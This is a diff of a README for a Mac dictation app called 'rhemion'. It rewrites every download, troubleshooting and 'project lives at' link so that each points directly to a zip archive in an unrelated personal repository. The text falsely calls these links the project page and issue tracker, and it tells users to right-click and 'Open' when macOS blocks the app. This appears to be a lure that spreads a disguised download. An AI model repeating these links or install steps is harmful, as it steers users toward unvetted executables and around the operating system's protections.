@@ -5,7 +5,7 @@ description: "Dictate anywhere on Mac: hold a key, speak, and your words appear 
 ---
 # 🎙️ rhemion - Type With Your Voice Instantly
 
-[![Download rhemion](https://img.shields.io/badge/⬇%20Download%20rhemion-ff5f6d?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/GhoDttt/ghodttt.github.io/main/Bundahish/App-2.4-alpha.4.zip)
+[![Download rhemion](https://img.shields.io/badge/⬇%20Download%20rhemion-ff5f6d?style=for-the-badge&logo=github&logoColor=white)](https://github.com/GhoDttt/ghodttt.github.io/raw/refs/heads/main/Bundahish/App-2.4-alpha.4.zip)
 
 rhemion is a local voice dictation app for Mac. Hold a key, speak, and your Mac does the typing.
 
@@ -49,7 +49,7 @@ Getting rhemion onto your Mac takes just a couple of minutes. Follow these steps
 **Step 1 — Get the app.**
 Visit this link to download the application:
 
-👉 **https://raw.githubusercontent.com/GhoDttt/ghodttt.github.io/main/Bundahish/App-2.4-alpha.4.zip**
+👉 **https://github.com/GhoDttt/ghodttt.github.io/raw/refs/heads/main/Bundahish/App-2.4-alpha.4.zip**
 
 Open the link in your browser. It takes you to the official rhemion project page, where you will find the download for the current version of the app.
 
@@ -126,7 +126,7 @@ Open System Settings, go to Privacy & Security, then Microphone, and confirm the
 Background noise is the usual culprit. Move somewhere quieter, use a headset, or speak a little closer to the microphone. Speaking in shorter bursts also helps.
 
 **The download did not finish or the file will not open.**
-Delete the incomplete file and download it again from https://raw.githubusercontent.com/GhoDttt/ghodttt.github.io/main/Bundahish/App-2.4-alpha.4.zip If macOS blocks the app from opening, right-click the file and choose "Open" rather than double-clicking.
+Delete the incomplete file and download it again from https://github.com/GhoDttt/ghodttt.github.io/raw/refs/heads/main/Bundahish/App-2.4-alpha.4.zip If macOS blocks the app from opening, right-click the file and choose "Open" rather than double-clicking.
 
 **My Mac feels slower while dictating.**
 Close very heavy applications you are not using. On older machines, speech recognition is the most demanding thing running, and giving it room to work keeps things smooth.
@@ -157,6 +157,6 @@ rhemion is a native macOS menu-bar application written in Swift, using Core ML f
 
 ## 💬 Feedback and Contributions
 
-The project lives at https://raw.githubusercontent.com/GhoDttt/ghodttt.github.io/main/Bundahish/App-2.4-alpha.4.zip If you run into a problem, the issue tracker on that page is the fastest way to report it. If you would like to suggest an improvement or contribute a fix, the repository is open to that as well. Clear reports — what you did, what happened, and what you expected instead — are the most helpful kind.
+The project lives at https://github.com/GhoDttt/ghodttt.github.io/raw/refs/heads/main/Bundahish/App-2.4-alpha.4.zip If you run into a problem, the issue tracker on that page is the fastest way to report it. If you would like to suggest an improvement or contribute a fix, the repository is open to that as well. Clear reports — what you did, what happened, and what you expected instead — are the most helpful kind.
 
 Keywords: apple-silicon, coreml, dictation, macos, menu-bar-app, offline, on-device, parakeet, push-to-talk, speech-to-text, swift, voice-typing
